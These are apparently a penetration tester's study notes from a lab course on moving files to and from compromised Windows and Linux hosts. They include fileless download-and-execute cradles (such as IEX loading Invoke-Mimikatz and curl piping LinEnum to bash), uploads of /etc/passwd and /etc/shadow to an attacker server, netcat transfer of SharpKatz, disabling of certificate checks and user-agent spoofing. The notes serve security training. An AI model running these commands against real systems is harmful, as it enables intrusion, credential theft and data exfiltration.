

- Article that covers pretty much everything: https://www.microsoft.com/en-us/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/
- Common Powershel Download Cradles: https://gist.github.com/HarmJ0y/bb48307ffa663256e239




General Notes:
- LNK triggered execution of WMIC tool 
- JS code used to download using the Bitsadmin tool
- Base64 encoding/decoding using Certuitl tool
![[file_transfer_techniques.png]]

- PowerShell -° System.Net.WebClient can be used to download via HTTP, HTTPS or FTP


```Powershell
# Downloading a file
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Powershellblalasdflasl','C:\Users\Public\Downloads\PowerView.ps1')

# Async Download
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/Powershellblalasdflasl','C:\Users\Public\Downloads\PowerView.ps1')
 
```


You can do fileless execution by directly using the Invoke-Expression Method 

```powershell
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

Common Errors can be bypassed by using `-UseBasicParsing`

```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Also you can bypass Certification issues using: 

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```


## Transfer Data using SMB


On your attacker machine you can setup an smb fileshare (ideally with username and password)
```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

This then can be mounted by the windows machine 

```cmd
C:\htb> net use n: \\192.168.220.133\share /user:test test
```

## Transfer Data using FTP


Starting up an FTP Server using Python 

```bash
sudo pip3 install pyftpdlib
```

After that we can fetch the file using a Windows instance with 

```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```


## Base64 Encoding Decoding


```powershell
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```


## Doing Web-uploads 


First setup your Fileserver on Linux to send data to
```bash
pip3 install uploadserver
python3 -m uploadserver 
```


And then use the other machine to Invoke a Webrequest


```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

```


```powershell
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

To send the upper payload you have to have an listening port open on your machine under `nc -lvnp 8080`


## SMB Uploads 

If companies are blocking smb you can do smb over HTTP using WebDav.WebDAV
https://datatracker.ietf.org/doc/html/rfc4918


Configure Webdav  using 

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

# You can use a windows system like the following to access it 
dir \\192.168.49.128\DavWWWRoot

# To upoload you can just use the copy command in windows 
copy C:\Users\johh\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```

## FTP Uploads 

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```



# Linux File Transfer Methods 



```bash
# Download using wget 
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

# Download using curl 
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# Fileless download with wget 
wget -q0- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

# Fileless download with curl 
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

# Checking for open Ports 
netstat -lnpt 

# Start a Web Server 
sudo python3 -m pip install --user uploadserver 

# Create a self-signed certificate 
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# Start a web server with tls 
mkdir https && cd https 
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

# Upload Multiple Files 
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure


# Create a Web Server with php 
php -S 0.0.0.0:8000

# Creating a Web Server with Ruby 
ruby -run -ehttpd . -p8000

# SCP Upload 
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```


## Transfering Files with Code 


```bash

# Using python 
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

# Using php with File_get_contents()
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

# Using php with Fopen()
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# Using Ruby
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'

# Perl 
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'

# Filedownload using javascript 

var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));

# Download using VBScript 

dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with

# VBScript with cscript.exe
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1

```

Uploading Stuff 

```bash
# Starting Bash uploadserver module 
python3 -m uploadserver 

# Uploading a file using a python One-liner 
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'

```


## Misc File Transfer Methods 

Filetransfer with Netcat and Ncat 

```bash
# Setup listener on Port 8000 on the victim machine 
nc -l -p 8000 > SharpKatz.exe 

# From the attacker machine we can send, where as the -q 0 closes the connection after upload 
nc -q 0 192.168.49.128 8000 < SharpKatz.exe

## Netcat - Attack Host - Sending File to compromised machine 
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe

nc -q 192.168.49.128 8000 < SharpKatz.exe

# And here some more options 
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe

sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

## PowerShell Session File Transfer 


```powershell
$Session = New-PSSession -computerName DATABASE01

# Now we can use the session to transfer dat 
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```


## Monting a Linux Folder Using rdesktop 


```bash
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
## Mounting a Linux Folder Using xfreerdp 

```bash
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```


# Protected File Transfers


Simples one in Windows is to use AESEncryption 

```powershell
Import-Module  Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```

# Encryption using linux 

```bash
# Encryption
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

# Decrytion
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```


## Misc 

Useful website regarding User Agent Strings https://useragentstring.com/index.php


You can fake your user agent using powershell like the following
```powershell-session
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```